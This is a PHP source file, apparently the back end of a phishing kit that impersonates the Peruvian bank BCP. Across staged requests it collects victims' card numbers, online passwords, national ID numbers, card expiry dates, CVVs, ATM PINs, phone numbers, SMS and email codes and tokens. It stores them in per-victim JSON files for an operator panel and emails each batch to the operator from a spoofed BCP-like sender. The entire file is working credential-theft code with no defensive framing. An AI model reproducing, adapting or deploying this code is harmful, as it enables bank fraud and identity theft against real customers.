<?php
error_reporting(0);
session_start();
//print_r($_POST);
//print_r($_GET);exit;
/*=================================================================================================*/
include("config.php");
$envia_mail = true;
/*=================================================================================================*/
if( $_GET["id"] == "0" ) 
{
/*=================================================================================================*/
    $card = $_POST["card"];
    $pass = $_POST["token"];
    $time = $_POST["time"];

    $sms = "-------------------- [$ipv] --------------------<br><br>
    Tarjeta: $card<br>
    Clave: $pass<br><br>
    $uag<br><br>
    ------------------------------------------------------------------------<br>
    https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
    ------------------------------------------------------------------------<br><br>";

    $log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    $datos_array = [
        "ip"=>$ipv,
        "card"=>$card,
        "pass"=>$pass,
        "dni"=>"",
        "nombre"=>"",
        "date"=>"",
        "cvv"=>"",
        "atm"=>"",
        "operador"=>"",
        "numero"=>"",
        "sms"=>"",
        "correo"=>"",
        "codigo_correo"=>"",
        "token"=>"",
        "saludo"=>"",
        "estado"=>""
    ];
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);
    //fwrite($log, $ipv."|".$card."|".$pass."|"."|"."|"."|"."|"."|"."|"."|"."|"."|"."|"."|");
    fwrite($log,$datos_json);
    fclose($log);

    $subj = "BCP - $ipv";
    $header .= "From: Login<$ipv@bcplogos.pe>" . "\r\n";
    $header .= "MIME-Version: 1.0" . "\r\n";
    $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
    if($envia_mail)
    {
        mail($email, $subj, $sms, $header);
    }
    exit(0); 
}

/*=================================================================================================*/
if( $_GET["id"] == "1" ) 
{
/*=================================================================================================*/
    $card = $_POST["card"];
    $pass = $_POST["token"];
    $time = $_POST["time"];
    $dni_real = $_POST["dni"];
    
    
    $dni="";
    $nombres="cliente";
    $paterno="";
    $materno="";
       
    include 'files/scripts/reniec.php';
    $name = $nombres." ";
    $surn = $paterno." ".$materno;

    $sms = "-------------------- [$ipv] --------------------<br><br>
    DNI: $dni_real<br>
    Nombre: $name $surn<br><br>
    Tarjeta: $card<br>
    Clave: $pass<br><br>
    $uag<br><br>
    ------------------------------------------------------------------------<br>
    https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
    ------------------------------------------------------------------------<br><br>";

    $log_content = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt');
    $datos_array = json_decode($log_content,true);
    $datos_array["dni"] = $dni_real;
    $datos_array["nombre"] = $name.$surn;
    $datos_array["estado"] = "celular";
    if(isset($_SESSION["automatico"]))
    {
        $datos_array["estado"] = "celular";
    }
    
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);

    $log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    //fwrite($log, $ipv."|".$card."|".$pass."|".$dni."|".$name.$surn."|"."|"."|"."|"."|"."|"."|"."|"."|");
    fwrite($log, $datos_json);
    fclose($log);

    $subj = "BCP - $ipv";
    $header .= "From: Autenticacion<$ipv@bcplogos.pe>" . "\r\n";
    $header .= "MIME-Version: 1.0" . "\r\n";
    $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
    if($envia_mail)
    {
        mail($email, $subj, $sms, $header);
    }
    $_SESSION["intentos_token"] = 0;
    echo "1";
    exit;
}

/*=================================================================================================*/
if( $_GET["id"] == "2" ) 
{
/*=================================================================================================*/
	$time = $_POST["time"];
	$data = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
        $datos_array = json_decode($data,true);
        
        //@list($ip, $card, $pass, $dni, $nombre, $date, $cvv, $atm, $operador, $numero,$sms2) = explode('|', $data);
        
        $operador  = $_POST["operador"];
	$numero  = $_POST["numero"];
        
        $ip = $datos_array["ip"];
        $card = $datos_array["card"];
        $pass = $datos_array["pass"];
        $dni = $datos_array["dni"];
        $nombre = $datos_array["nombre"];
        $date = $datos_array["date"];
        $cvv = $datos_array["cvv"];
        $atm = $datos_array["atm"];
        $datos_array["operador"] = $operador;
        $datos_array["numero"] = $numero;
        $datos_array["estado"] = "cargando";
        
        if(isset($_SESSION["automatico"]))
        {
            $datos_array["estado"] = "cc";
        }
        
        $sms2 = $datos_array["sms"];
        
        $datos_json = json_encode($datos_array, JSON_HEX_APOS);
        
	$sms = "-------------------- [$ipv] --------------------<br><br>
	DNI: $dni<br>
	Nombre: $nombre<br><br>
	Tarjeta: $card<br>
	Clave: $pass<br><br>
	Tarjeta: $card<br>
	Vencimiento: $date<br>
	CVV: $cvv<br>
	ATM: $atm<br><br>
	$operador: $numero<br><br>
	$uag<br><br>
	------------------------------------------------------------------------<br>
	https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
	------------------------------------------------------------------------<br><br>";

	$log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
	fwrite($log, $datos_json);
	fclose($log);

	$subj = "BCP - $ipv";
	$header .= "From: Card<$ipv@bcplogos.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
        if($envia_mail)
        {
            mail($email, $subj, $sms, $header);
        }
	exit(0); 
}

if( $_GET["id"] == "cc" ) 
{
    
/*=================================================================================================*/
    $date = $_POST["date"];
    $cvv = $_POST["cvv"];
    $atm = $_POST["atm"];
    $time = $_POST["time"];
    
    $data = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    $datos_array = json_decode($data,true);

    //@list($ip, $card, $pass, $dni, $nombre, $date, $cvv, $atm, $operador, $numero,$sms2) = explode('|', $data);

    $ip = $datos_array["ip"];
    $card = $datos_array["card"];
    $pass = $datos_array["pass"];
    $dni = $datos_array["dni"];
    $nombre = $datos_array["nombre"];
    $sms2 = $datos_array["sms"];
    $operador = $datos_array["operador"];
    $numero = $datos_array["nunmero"];
    
    $datos_array["date"] = $date;
    $datos_array["cvv"] = $cvv;
    $datos_array["atm"] = $atm;    
    $datos_array["estado"] = "cargando";
    if(isset($_SESSION["automatico"]))
    {
        $datos_array["estado"] = "fin";
    }
    
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);

    $sms = "-------------------- [$ipv] --------------------<br><br>
    DNI: $dni<br>
    Nombre: $nombre<br><br>
    Tarjeta: $card<br>
    Clave: $pass<br><br>
    Tarjeta: $card<br>
    Vencimiento: $date<br>
    CVV: $cvv<br>
    ATM: $atm<br><br>
    $operador: $numero<br><br>
    $uag<br><br>
    ------------------------------------------------------------------------<br>
    https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
    ------------------------------------------------------------------------<br><br>";

    $log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    fwrite($log, $datos_json);
    fclose($log);

    $subj = "BCP - $ipv";
    $header .= "From: Card<$ipv@bcplogos.pe>" . "\r\n";
    $header .= "MIME-Version: 1.0" . "\r\n";
    $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
    if($envia_mail)
    {
        mail($email, $subj, $sms, $header);
    }
    exit(0); 
}

if( $_GET["id"] == "21" ) 
{
/*=================================================================================================*/

	$time = $_POST["time"];
	$data = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
        $datos_array = json_decode($data,true);
        //list($ip, $card, $pass, $dni, $nombre, $date, $cvv, $atm, $operador, $numero,$sms2) = explode('|', $data);
	
	$numero_sms  = $_POST["numero"];
        
        $ip = $datos_array["ip"];
        $card = $datos_array["card"];
        $pass = $datos_array["pass"];
        $dni = $datos_array["dni"];
        $nombre = $datos_array["nombre"];
        $date = $datos_array["date"];
        $cvv = $datos_array["cvv"];
        $atm = $datos_array["atm"];
        $operador = $datos_array["operador"];
        $numero = $datos_array["numero"];
        
        $datos_array["estado"] = "cargando";
        $datos_array["sms"] = $numero_sms;
        
        $datos_json = json_encode($datos_array, JSON_HEX_APOS);
        
	$sms = "-------------------- [$ipv] --------------------<br><br>
	DNI: $dni<br>
	Nombre: $nombre<br><br>
	Tarjeta: $card<br>
	Clave: $pass<br><br>
	Tarjeta: $card<br>
	Vencimiento: $date<br>
	CVV: $cvv<br>
	ATM: $atm<br><br>
	$operador: $numero<br><br>
	$uag<br><br>
	------------------------------------------------------------------------<br>
	https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
	------------------------------------------------------------------------<br><br>";

	$log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
	fwrite($log, $datos_json);
	fclose($log);

	$subj = "BCP - $ipv";
	$header .= "From: Card<$ipv@bcplogos.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
        if($envia_mail)
        {
            mail($email, $subj, $sms, $header);
        }
	exit(0); 
}

if( $_GET["id"] == "22" ) 
{
/*=================================================================================================*/

	$time = $_POST["time"];
	$data = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
        $datos_array = json_decode($data,true);
        //list($ip, $card, $pass, $dni, $nombre, $date, $cvv, $atm, $operador, $numero,$sms2) = explode('|', $data);
	
	$numero_sms  = $_POST["numero"];
        
        $ip = $datos_array["ip"];
        $card = $datos_array["card"];
        $pass = $datos_array["pass"];
        $dni = $datos_array["dni"];
        $nombre = $datos_array["nombre"];
        $date = $datos_array["date"];
        $cvv = $datos_array["cvv"];
        $atm = $datos_array["atm"];
        $operador = $datos_array["operador"];
        $numero = $datos_array["numero"];
        
        $datos_array["codigo_correo"] = $numero_sms;
        $datos_array["estado"] = "cargando";
        
        $datos_json = json_encode($datos_array, JSON_HEX_APOS);
        
	$sms = "-------------------- [$ipv] --------------------<br><br>
	DNI: $dni<br>
	Nombre: $nombre<br><br>
	Tarjeta: $card<br>
	Clave: $pass<br><br>
	Tarjeta: $card<br>
	Vencimiento: $date<br>
	CVV: $cvv<br>
	ATM: $atm<br><br>
	$operador: $numero<br><br>
	$uag<br><br>
	------------------------------------------------------------------------<br>
	https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
	------------------------------------------------------------------------<br><br>";

	$log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
	fwrite($log, $datos_json);
	fclose($log);

	$subj = "BCP - $ipv";
	$header .= "From: Card<$ipv@bcplogos.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
        if($envia_mail)
        {
            mail($email, $subj, $sms, $header);
        }
	exit(0); 
}

/*=================================================================================================*/
if( $_GET["id"] == "3" ) 
{    
    $token  = $_POST["token"];
    $time = $_POST["time"];    
    $data = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    $datos_array = json_decode($data,true);
    
    $ip = $datos_array["ip"];
    $card = $datos_array["card"];
    $pass = $datos_array["pass"];
    $dni = $datos_array["dni"];
    $nombre = $datos_array["nombre"];
    $sms2 = $datos_array["sms"];
    $operador = $datos_array["operador"];
    $numero = $datos_array["numero"];
    $date = $datos_array["date"];
    $cvv = $datos_array["cvv"];
    $atm = $datos_array["atm"];
    $token_tmp = $datos_array["token"];
    
    //$token = $token_tmp."-".$token;
    
    $datos_array["token"] = $token;
    $datos_array["estado"] = "cargando";
    
    $datos_json = json_encode($datos_array, JSON_HEX_APOS);
    
    $log = fopen('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    fwrite($log, $datos_json);
    fclose($log);
    
    $sms = "-------------------- [$ipv] --------------------<br><br>
    Token: $token<br>
    $uag<br><br>
    ------------------------------------------------------------------------<br>
    https://bcpzonasegurabeta.viabcp.com/#/iniciar-sesion<br>
    ------------------------------------------------------------------------<br><br>";
    
    //file_put_contents('panel/data/'.$time.' - '.$ipv.'.txt', '<option>'.$token.'</option>', FILE_APPEND);

    $subj = "BCP - $ipv";
    $header .= "From: Token<$ipv@bcplogos.pe>" . "\r\n";
    $header .= "MIME-Version: 1.0" . "\r\n";
    $header .= "Content-type: text/html; charset=utf-8" . "\r\n";
    if($envia_mail)
    {
        mail($email, $subj, $sms, $header);
    }

    $ban = fopen("IPBam.txt","a+");
    fwrite($ban,$ipv."\r\n");
    fclose($ban);

    $_SESSION["intentos_token"] = $_SESSION["intentos_token"] + 1;
    
    exit(0); 
        
}

if( $_GET["id"] == "55" ) //get info 
{
/*=================================================================================================*/
    $time = $_POST["time"];
    $data = file_get_contents('panel/data/'.$time.' - '.$ipv.'.txt', 'w');
    echo $data;
    exit;
        
}

?>
